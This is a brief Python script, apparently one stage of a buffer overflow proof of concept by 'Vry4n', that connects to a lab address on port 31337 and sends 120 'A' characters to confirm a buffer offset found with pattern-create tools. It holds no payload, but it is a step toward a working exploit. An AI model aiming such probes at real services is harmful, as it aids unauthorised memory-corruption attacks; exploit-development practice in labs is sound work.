#!/usr/bin/python
import socket

# Part 3 of proof of concept by Vry4n
# This script is intended send the size of the buffer with As as identified by pattern create and pattern offset

FUZZ = 'A' * 120
print("Fuzzing with {} bytes".format(len(FUZZ)))
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect = s.connect(("192.168.0.13", 31337))
s.recv(1024)
s.send(FUZZ.encode())
s.close()
